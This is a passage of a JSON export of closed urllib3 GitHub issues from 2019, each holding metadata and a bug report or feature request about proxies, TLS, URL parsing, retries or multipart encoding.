"https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1680/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1680/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1680/events", "html_url": "https://github.com/urllib3/urllib3/issues/1680", "id": 495792947, "node_id": "MDU6SXNzdWU0OTU3OTI5NDc=", "number": 1680, "title": "Missing body using DELETE and ProxyManager", "user": {"login": "Lejurn", "id": 7059315, "node_id": "MDQ6VXNlcjcwNTkzMTU=", "avatar_url": "https://avatars0.githubusercontent.com/u/7059315?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Lejurn", "html_url": "https://github.com/Lejurn", "followers_url": "https://api.github.com/users/Lejurn/followers", "following_url": "https://api.github.com/users/Lejurn/following{/other_user}", "gists_url": "https://api.github.com/users/Lejurn/gists{/gist_id}", "starred_url": "https://api.github.com/users/Lejurn/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Lejurn/subscriptions", "organizations_url": "https://api.github.com/users/Lejurn/orgs", "repos_url": "https://api.github.com/users/Lejurn/repos", "events_url": "https://api.github.com/users/Lejurn/events{/privacy}", "received_events_url": "https://api.github.com/users/Lejurn/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-09-19T13:16:06Z", "updated_at": "2019-09-20T17:07:36Z", "closed_at": "2019-09-20T17:07:36Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI discovered a strange issue in urllib3 version 1.24.1 and python3 version 3.7.3 . The body of the DELETE requests is missing, using a proxy and a HTTPS connection. Event though the content-length is correct. I'm using BurpSuite as proxy. \r\n\r\nFirst I discovered the issue using the requests lib, but was able to reproduce the issue using urllib3:\r\n\r\n```python\r\nimport urllib3\r\nproxy = urllib3.ProxyManager('https://localhost:8080/', cert_reqs='CERT_NONE', assert_hostname=False)\r\nproxy.request('DELETE', 'https://192.168.5.1/test', body=\"test\")\r\n```\r\nUsing the request lib I was able to trace the request, through urllib3/contrib/pyopenssl.py, to the OpenSSL.SSL.Connection.sendall function, the body was still intact.\r\nI'm not sure why the body is missing, because these function just seems to write the buffer to the corresponding socket. \r\n\r\nUsing http.client I'm able to send DELETE requests including the body, so it don't seems to be an issue related to the proxy software.\r\n\r\n\r\n\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1678", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1678/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1678/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1678/events", "html_url": "https://github.com/urllib3/urllib3/issues/1678", "id": 494275705, "node_id": "MDU6SXNzdWU0OTQyNzU3MDU=", "number": 1678, "title": "Certificate verify failed: self signed certificate (_ssl.c:1056)", "user": {"login": "vladns", "id": 22105830, "node_id": "MDQ6VXNlcjIyMTA1ODMw", "avatar_url": "https://avatars1.githubusercontent.com/u/22105830?v=4", "gravatar_id": "", "url": "https://api.github.com/users/vladns", "html_url": "https://github.com/vladns", "followers_url": "https://api.github.com/users/vladns/followers", "following_url": "https://api.github.com/users/vladns/following{/other_user}", "gists_url": "https://api.github.com/users/vladns/gists{/gist_id}", "starred_url": "https://api.github.com/users/vladns/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/vladns/subscriptions", "organizations_url": "https://api.github.com/users/vladns/orgs", "repos_url": "https://api.github.com/users/vladns/repos", "events_url": "https://api.github.com/users/vladns/events{/privacy}", "received_events_url": "https://api.github.com/users/vladns/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-09-16T21:02:35Z", "updated_at": "2019-09-17T19:00:16Z", "closed_at": "2019-09-16T22:36:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "On the local network, I'm using ProxHTTPSProxyMII https://github.com/wheever/ProxHTTPSProxyMII. When I request from the browser https://192.168.2.1/, I get this error. This only happens with urllib 1.25.x. There is no such problem with the older version of urllib 1.24.2. I am not sure what the problem is in urllib, help sort it out. Sorry if my question is not about the kernel.\r\n![2019-09-16_233512](https://user-images.githubusercontent.com/22105830/64993280-54e2cd80-d8de-11e9-82f1-79a879059da5.png)\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1677", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1677/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1677/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1677/events", "html_url": "https://github.com/urllib3/urllib3/issues/1677", "id": 491439689, "node_id": "MDU6SXNzdWU0OTE0Mzk2ODk=", "number": 1677, "title": "urllib3.util._encode_invalid_chars() changes the percent-encoded bytes to upper case", "user": {"login": "calvinpark", "id": 931180, "node_id": "MDQ6VXNlcjkzMTE4MA==", "avatar_url": "https://avatars3.githubusercontent.com/u/931180?v=4", "gravatar_id": "", "url": "https://api.github.com/users/calvinpark", "html_url": "https://github.com/calvinpark", "followers_url": "https://api.github.com/users/calvinpark/followers", "following_url": "https://api.github.com/users/calvinpark/following{/other_user}", "gists_url": "https://api.github.com/users/calvinpark/gists{/gist_id}", "starred_url": "https://api.github.com/users/calvinpark/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/calvinpark/subscriptions", "organizations_url": "https://api.github.com/users/calvinpark/orgs", "repos_url": "https://api.github.com/users/calvinpark/repos", "events_url": "https://api.github.com/users/calvinpark/events{/privacy}", "received_events_url": "https://api.github.com/users/calvinpark/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-09-10T04:13:34Z", "updated_at": "2019-09-10T13:50:32Z", "closed_at": "2019-09-10T11:26:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "https://github.com/urllib3/urllib3/blob/master/src/urllib3/util/url.py#L223-L224\r\n```\r\n# Normalize existing percent-encoded bytes.\r\nfor enc in percent_encodings:\r\n    if not enc.isupper():\r\n        component = component.replace(enc, enc.upper())\r\n```\r\n\r\nIf a URL is parsed using `urllib3.util.parse_url()` then put back together, the original URL does not match the recomposed URL.\r\n\r\n```\r\nimport urllib3\r\n\r\n\r\norigin = \"https://google.com/some/dir/libgd-gd2-perl_1%3a2.66-1build1.deb\"\r\n\r\nurl = urllib3.util.parse_url(origin)\r\n\r\nrecomposed = f\"{url.scheme}://{url.host}{url.path}\"\r\n\r\nprint(origin)      # https://google.com/some/dir/libgd-gd2-perl_1%3a2.66-1build1.deb\r\nprint(recomposed)  # https://google.com/some/dir/libgd-gd2-perl_1%3A2.66-1build1.deb\r\n\r\nassert(origin == recomposed)  # Fails\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1675", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1675/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1675/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1675/events", "html_url": "https://github.com/urllib3/urllib3/issues/1675", "id": 487942333, "node_id": "MDU6SXNzdWU0ODc5NDIzMzM=", "number": 1675, "title": "Custom retry handling support", "user": {"login": "sonmezonur", "id": 12400946, "node_id": "MDQ6VXNlcjEyNDAwOTQ2", "avatar_url": "https://avatars1.githubusercontent.com/u/12400946?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sonmezonur", "html_url": "https://github.com/sonmezonur", "followers_url": "https://api.github.com/users/sonmezonur/followers", "following_url": "https://api.github.com/users/sonmezonur/following{/other_user}", "gists_url": "https://api.github.com/users/sonmezonur/gists{/gist_id}", "starred_url": "https://api.github.com/users/sonmezonur/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sonmezonur/subscriptions", "organizations_url": "https://api.github.com/users/sonmezonur/orgs", "repos_url": "https://api.github.com/users/sonmezonur/repos", "events_url": "https://api.github.com/users/sonmezonur/events{/privacy}", "received_events_url": "https://api.github.com/users/sonmezonur/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-09-01T23:22:32Z", "updated_at": "2019-10-18T22:59:46Z", "closed_at": "2019-10-18T22:59:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, thanks for implementing and maintaining **urllib3**. \r\n\r\nRetry mechanism based on _status_forcelist_ and _method_whitelist_ perfectly works. But in some rare cases, when APIs are not well-constructed, it is required to add custom retry handling. \r\n\r\n\r\n* Consider following response format:\r\n\r\n`\r\n\"status_code\": 400,\r\n\"body\": {\r\n  \"error\": \" Service temporarily unavailable.\"\r\n}\r\n`\r\n\r\nGenerally, you don't want to retry on bad requests(400). An ideal response code for this request might be 503. But since it is not restricted, it might be some other HTTP formats. So my proposal is to add a generic solution for retry mechanism which enables  **urllib3** users to integrate their custom logic.\r\n\r\nI found it useful to integrate callback function  into [Retry](https://github.com/urllib3/urllib3/blob/master/src/urllib3/util/retry.py#L29), which injects response as a parameter to callback function when [urlopen()](https://github.com/urllib3/urllib3/blob/master/src/urllib3/connectionpool.py#L488) is triggered on [HTTPConnectionPool](https://github.com/urllib3/urllib3/blob/master/src/urllib3/connectionpool.py#L97). Thus, retry logic can be implemented by parsing this response. \r\n\r\n* Example callback function: \r\n```python\r\n    def callback(res):\r\n            expected_error_msg = \"Service temporarily unavailable\"\r\n            response_json = res.json()\r\n            error_msg = response_json[\"error\"]\r\n            return res.status_code == 400 and error_msg == expected_error_msg\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1674", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1674/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1674/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1674/events", "html_url": "https://github.com/urllib3/urllib3/issues/1674", "id": 487377335, "node_id": "MDU6SXNzdWU0ODczNzczMzU=", "number": 1674, "title": "SecureTransport module does not actually support TLS 1.3", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-30T09:14:12Z", "updated_at": "2019-10-04T20:40:41Z", "closed_at": "2019-10-04T20:40:41Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "I believe that we can't make get TLS 1.3 support from SecureTransport, even if the documentation suggests otherwise. I made various requests and looked at the Wireshark traces:\r\n\r\n * Firefox and Safari do use TLS 1.3\r\n * urllib3 uses TLS 1.2 at best, and actually fails when TLS 1.3 is requested by modifying the code, exactly like https://forums.developer.apple.com/thread/110369\r\n * curl (compiled with SecureTransport support) uses TLS 1.2 at best, but never fails\r\n\r\nI made sure to:\r\n\r\n* use `sudo defaults write /Library/Preferences/com.apple.networkd tcp_conect_enable_tls13 1`,\r\n* look at the ClientHello message\r\n* check that TLS 1.3 messages were real, even if they're pretending they're TLS 1.2 per the spec.\r\n\r\nAdditionally, we never tested SecureTansport TLS 1.3 support in CI because we were using Python 3.7.1 which does not support TLS 1.3. Using Python 3.7.4, `test_tls_protocol_name_of_socket` started to fail with SecureTransport: we were requesting TLS 1.3, but got back TLS 1.2. (which is why I removed TLS 1.3 from SecureTransport tests in https://github.com/urllib3/urllib3/pull/1671.)\r\n\r\nNow that SecureTransport is deprecated, we won't get any help from Apple (again, see https://forums.developer.apple.com/thread/110369 which recommends using the new library instead). I think we should remove the TLS 1.3 code from the SecureTransport module and document that we don't support TLS 1.3 with SecureTransport.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1670", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1670/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1670/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1670/events", "html_url": "https://github.com/urllib3/urllib3/issues/1670", "id": 486101189, "node_id": "MDU6SXNzdWU0ODYxMDExODk=", "number": 1670, "title": "urllib3 return \"Bad Request: wrong URL host\"", "user": {"login": "essems", "id": 12759208, "node_id": "MDQ6VXNlcjEyNzU5MjA4", "avatar_url": "https://avatars3.githubusercontent.com/u/12759208?v=4", "gravatar_id": "", "url": "https://api.github.com/users/essems", "html_url": "https://github.com/essems", "followers_url": "https://api.github.com/users/essems/followers", "following_url": "https://api.github.com/users/essems/following{/other_user}", "gists_url": "https://api.github.com/users/essems/gists{/gist_id}", "starred_url": "https://api.github.com/users/essems/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/essems/subscriptions", "organizations_url": "https://api.github.com/users/essems/orgs", "repos_url": "https://api.github.com/users/essems/repos", "events_url": "https://api.github.com/users/essems/events{/privacy}", "received_events_url": "https://api.github.com/users/essems/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-08-28T00:36:25Z", "updated_at": "2019-08-29T00:27:16Z", "closed_at": "2019-08-29T00:27:16Z", "author_association": "NONE", "active_lock_reason": null, "body": "I want to send some file to telelgram like this:\r\n```\r\nr = http.request(\"POST\", \"TELEGRAM URL\", \r\n    fields={ \"chat_id\" : \"@CHANNEL_ID\", \r\n             \"document\" : ('\ud55c\uae00.hwp', open('SOMEFILE', 'rb').read())})\r\n```\r\nBut urllib3 returns error like below.\r\n`b'{\"ok\":false,\"error_code\":400,\"description\":\"Bad Request: wrong URL host\"}'`\r\n\r\nI tried some debugging, finally found something.\r\nIn fields.py\r\n```\r\ndef format_header_param(name, value):\r\n    \"\"\"\r\n    Helper function to format and quote a single header parameter.\r\n\r\n    Particularly useful for header parameters which might contain\r\n    non-ASCII values, like file names. This follows RFC 2231, as\r\n    suggested by RFC 2388 Section 4.4.\r\n\r\n    :param name:\r\n        The name of the parameter, a string expected to be ASCII only.\r\n    :param value:\r\n        The value of the parameter, provided as a unicode string.\r\n    \"\"\"\r\n    if not any(ch in value for ch in '\"\\\\\\r\\n'):\r\n        result = '%s=\"%s\"' % (name, value)\r\n        try:\r\n            result.encode('ascii')\r\n        except (UnicodeEncodeError, UnicodeDecodeError):\r\n            pass\r\n        else:\r\n            return result\r\n    if not six.PY3 and isinstance(value, six.text_type):  # Python 2:\r\n        value = value.encode('utf-8')\r\n    value = email.utils.encode_rfc2231(value, 'utf-8')\r\n    value = '%s*=%s' % (name, value)\r\n    return value\r\n```\r\nAccording to comment in fields.py, \r\n'param name' expected to be ascii only. But 'param value' is not.\r\nIn my case, param value(\"\ud55c\uae00.hwp\") is not ascii only. \r\nBut in fields.py, trying to test 'result' whether string is ascii only after concatenating 'name' and 'value'.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1667", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1667/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1667/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1667/events", "html_url": "https://github.com/urllib3/urllib3/issues/1667", "id": 482999025, "node_id": "MDU6SXNzdWU0ODI5OTkwMjU=", "number": 1667, "title": "Unable to parse Selenium commercial hub URLs using urllib3 >= 1.25", "user": {"login": "j7an", "id": 11568283, "node_id": "MDQ6VXNlcjExNTY4Mjgz", "avatar_url": "https://avatars0.githubusercontent.com/u/11568283?v=4", "gravatar_id": "", "url": "https://api.github.com/users/j7an", "html_url": "https://github.com/j7an", "followers_url": "https://api.github.com/users/j7an/followers", "following_url": "https://api.github.com/users/j7an/following{/other_user}", "gists_url": "https://api.github.com/users/j7an/gists{/gist_id}", "starred_url": "https://api.github.com/users/j7an/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/j7an/subscriptions", "organizations_url": "https://api.github.com/users/j7an/orgs", "repos_url": "https://api.github.com/users/j7an/repos", "events_url": "https://api.github.com/users/j7an/events{/privacy}", "received_events_url": "https://api.github.com/users/j7an/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-08-20T17:53:28Z", "updated_at": "2019-09-25T02:31:33Z", "closed_at": "2019-09-25T02:31:32Z", "author_association": "NONE", "active_lock_reason": null, "body": "Relates to issue filed @ [Selenium Repo](https://github.com/SeleniumHQ/selenium/issues/7506)\r\n\r\n## \ud83d\udc1b Bug Report\r\n\r\nurllib3 >= 1.25 can not parse Selenium Hub URLs that are from commercial Selenium platforms e.g. Cross Browser Testing.\r\n\r\n## To Reproduce\r\n\r\n1. Install selenium `pip install selenium` which installs the latest v1.25.3 of urllib3\r\n2. Install requests `pip install requests`\r\n\r\nrun following\r\n```\r\nimport unittest\r\nfrom selenium import webdriver\r\nimport requests\r\n\r\n\r\nclass BasicTest(unittest.TestCase):\r\n    def setUp(self):\r\n\r\n        # Put your username and authey below\r\n        # You can find your authkey at crossbrowsertesting.com/account\r\n        self.username = \"test@nowhere.com\"\r\n        self.authkey = \"examplekey\"\r\n\r\n        self.api_session = requests.Session()\r\n        self.api_session.auth = (self.username, self.authkey)\r\n\r\n        self.test_result = None\r\n\r\n        caps = {}\r\n\r\n        caps['name'] = 'Basic Test Example'\r\n        caps['build'] = '1.0'\r\n        caps['browserName'] = 'Firefox'\r\n        caps['version'] = '65x64'\r\n        caps['platform'] = 'Windows 10'\r\n        caps['screenResolution'] = '1920x1080'\r\n\r\n        # start the remote browser on our server\r\n        self.driver = webdriver.Remote(\r\n            desired_capabilities=caps,\r\n            command_executor=\"http://%s:%s@hub.crossbrowsertesting.com:80/wd/hub\" % (self.username, self.authkey)\r\n        )\r\n\r\n        self.driver.implicitly_wait(20)\r\n\r\n    def test_CBT(self):\r\n        # We wrap this all in a try/except so we can set pass/fail at the end\r\n        try:\r\n            # load the page url\r\n            print('Loading Url')\r\n            self.driver.get('http://crossbrowsertesting.github.io/selenium_example_page.html')\r\n\r\n            # maximize the window - DESKTOPS ONLY\r\n            # print('Maximizing window')\r\n            # self.driver.maximize_window()\r\n\r\n            # check the title\r\n            print('Checking title')\r\n            self.assertEqual(\"Selenium Test Example Page\", self.driver.title)\r\n\r\n            # if we are still in the try block after all of our assertions that\r\n            # means our test has had no failures, so we set the status to \"pass\"\r\n            self.test_result = 'pass'\r\n\r\n        except AssertionError as e:\r\n\r\n            # if any assertions are false, we take a snapshot of the screen, log\r\n            # the error message, and set the score to \"during tearDown()\".\r\n\r\n            snapshot_hash = self.api_session.post(\r\n                'https://crossbrowsertesting.com/api/v3/selenium/' + self.driver.session_id + '/snapshots').json()[\r\n                'hash']\r\n            self.api_session.put(\r\n                'https://crossbrowsertesting.com/api/v3/selenium/' + self.driver.session_id + '/snapshots/' + snapshot_hash,\r\n                data={'description': \"AssertionError: \" + str(e)})\r\n            self.test_result = 'fail'\r\n            raise\r\n\r\n    def tearDown(self):\r\n        print(\"Done with session %s\" % self.driver.session_id)\r\n        self.driver.quit()\r\n        # Here we make the api call to set the test's score.\r\n        # Pass it it passes, fail if an assertion fails, unset if the test didn't finish\r\n        if self.test_result is not None:\r\n            self.api_session.put('https://crossbrowsertesting.com/api/v3/selenium/' + self.driver.session_id,\r\n                                 data={'action': 'set_score', 'score': self.test_result})\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n```\r\n\r\nThe following error is generated:\r\n\r\n```\r\n  File \"/Users/name/Documents/quick-tests/cbt/env/lib/python2.7/site-packages/urllib3/request.py\", line 72, in request\r\n    **urlopen_kw)\r\n  File \"/Users/name/Documents/quick-tests/cbt/env/lib/python2.7/site-packages/urllib3/request.py\", line 150, in request_encode_body\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/Users/name/Documents/quick-tests/cbt/env/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 314, in urlopen\r\n    u = parse_url(url)\r\n  File \"/Users/name/Documents/quick-tests/cbt/env/lib/python2.7/site-packages/urllib3/util/url.py\", line 234, in parse_url\r\n    raise LocationParseError(url)\r\nLocationParseError: Failed to parse: http://test@nowhere.com:examplekey@216.37.72.238:80/wd/hub/session\r\n```\r\n\r\n## Expected behavior\r\n\r\nInstall an older version of urllib3: `pip install urllib3==1.24.3`\r\n\r\nRun the same test file again. The error will change to incorrect auth which is expected behavior.\r\n\r\n## Environment\r\n\r\nOS: OSX\r\nBrowser: Firefox\r\nBrowser version: 65\r\nBrowser Driver version: 0.24\r\nLanguage Bindings version: Python 3.141.0 and 3.14.0\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1664", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1664/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1664/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1664/events", "html_url": "https://github.com/urllib3/urllib3/issues/1664", "id": 481520081, "node_id": "MDU6SXNzdWU0ODE1MjAwODE=", "number": 1664, "title": "Windows Python 3.7.4 tests fail in AppVeyor CI", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-08-16T09:17:48Z", "updated_at": "2019-09-19T13:54:43Z", "closed_at": "2019-09-19T13:54:43Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Quoting myself from https://github.com/urllib3/urllib3/pull/1604#issuecomment-519009281:\r\n\r\n> The Python 3.7 Windows failure is reproducible. I compared the [last good 3.7 build](https://ci.appveyor.com/project/urllib3/urllib3/builds/26274262/job/9678kar0ro9ohn1j) with the [first bad 3.7 build](https://ci.appveyor.com/project/urllib3/urllib3/builds/26524209/job/vshduc3gpd898dqp), and noticed that Python was updated from 3.7.3 to 3.7.4, and OpenSSL from 1.1.0j to 1.1.1c as part of https://bugs.python.org/issue34631.\r\n> \r\n> Here's my understanding of the failures:\r\n> \r\n>  *  TestConnectionPool.test_source_address_error appears to fail because [InvalidUrl is now being raised in the standard library](https://github.com/python/cpython/blob/3.7/Lib/http/client.py#L1114-L1118) and I guess we no longer catch the correct exception? But why only on Windows?\r\n>  * TestHTTPS.test_client_no_intermediate and TestHTTPS_TLSv1_3.test_client_no_intermediate seem to fail because the OpenSSL exception is being converted into a SocketError in https://github.com/urllib3/urllib3/blob/master/src/urllib3/contrib/pyopenssl.py#L345-L346, maybe because the execution path changed?\r\n>  * TestHTTPS_TLSv1_3.test_set_ssl_version_to_tls_version fails because there are no certs defined in TestHTTPS_TLSv1_3, so self.certs[\"ssl_version\"] can't work", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1660", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1660/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1660/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1660/events", "html_url": "https://github.com/urllib3/urllib3/issues/1660", "id": 478011572, "node_id": "MDU6SXNzdWU0NzgwMTE1NzI=", "number": 1660, "title": "ValueError: I/O operation on closed file.", "user": {"login": "astronouth7303", "id": 401438, "node_id": "MDQ6VXNlcjQwMTQzOA==", "avatar_url": "https://avatars3.githubusercontent.com/u/401438?v=4", "gravatar_id": "", "url": "https://api.github.com/users/astronouth7303", "html_url": "https://github.com/astronouth7303", "followers_url": "https://api.github.com/users/astronouth7303/followers", "following_url": "https://api.github.com/users/astronouth7303/following{/other_user}", "gists_url": "https://api.github.com/users/astronouth7303/gists{/gist_id}", "starred_url": "https://api.github.com/users/astronouth7303/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/astronouth7303/subscriptions", "organizations_url": "https://api.github.com/users/astronouth7303/orgs", "repos_url": "https://api.github.com/users/astronouth7303/repos", "events_url": "https://api.github.com/users/astronouth7303/events{/privacy}", "received_events_url": "https://api.github.com/users/astronouth7303/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-08-07T15:54:21Z", "updated_at": "2019-08-13T20:28:18Z", "closed_at": "2019-08-13T20:28:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\n>>> import urllib3                                                                  \r\n>>> http = urllib3.PoolManager()                                                    \r\n>>> with http.request('GET', 'https://google.com/') as r:  \r\n...     l = len(r.data)\r\n... \r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nValueError: I/O operation on closed file.\r\n```\r\n\r\nI am very confused and not sure where to begin?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1659", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1659/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1659/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1659/events", "html_url": "https://github.com/urllib3/urllib3/issues/1659", "id": 473953520, "node_id": "MDU6SXNzdWU0NzM5NTM1MjA=", "number": 1659, "title": "After urllib3 upgrade verify=False does not work", "user": {"login": "6w3", "id": 30936791, "node_id": "MDQ6VXNlcjMwOTM2Nzkx", "avatar_url": "https://avatars2.githubusercontent.com/u/30936791?v=4", "gravatar_id": "", "url": "https://api.github.com/users/6w3", "html_url": "https://github.com/6w3", "followers_url": "https://api.github.com/users/6w3/followers", "following_url": "https://api.github.com/users/6w3/following{/other_user}", "gists_url": "https://api.github.com/users/6w3/gists{/gist_id}", "starred_url": "https://api.github.com/users/6w3/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/6w3/subscriptions", "organizations_url": "https://api.github.com/users/6w3/orgs", "repos_url": "https://api.github.com/users/6w3/repos", "events_url": "https://api.github.com/users/6w3/events{/privacy}", "received_events_url": "https://api.github.com/users/6w3/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-29T09:43:52Z", "updated_at": "2019-07-29T13:11:58Z", "closed_at": "2019-07-29T13:11:50Z", "author_association": "NONE", "active_lock_reason": null, "body": "This behaves differently in 1.24.1 and 1.25.3:\r\n\r\n```\r\nimport urllib3\r\nhttp = urllib3.PoolManager()\r\n\r\ntry:\r\n    r = http.request(\r\n        'GET', 'https://ksfe.com/',  # some site with untrusted certificate\r\n        verify=False\r\n    )\r\nexcept Exception as e:\r\n    print('Exception was raised:' + str(e))\r\nelse:\r\n    print('No exception')\r\n```\r\n\r\nIt looks like verify=False is ignored\r\n\r\n1.24.1:\r\n\r\n```\r\n***/.local/lib/python3.6/site-packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings\r\n  InsecureRequestWarning)\r\nNo exception\r\n```\r\n\r\n1.25.3:\r\n```\r\nException was raised:HTTPSConnectionPool(host='***', port=443): Max retries exceeded with url: *** (Caused by SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:847)'),))\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1658", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1658/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1658/comments", "events_url": 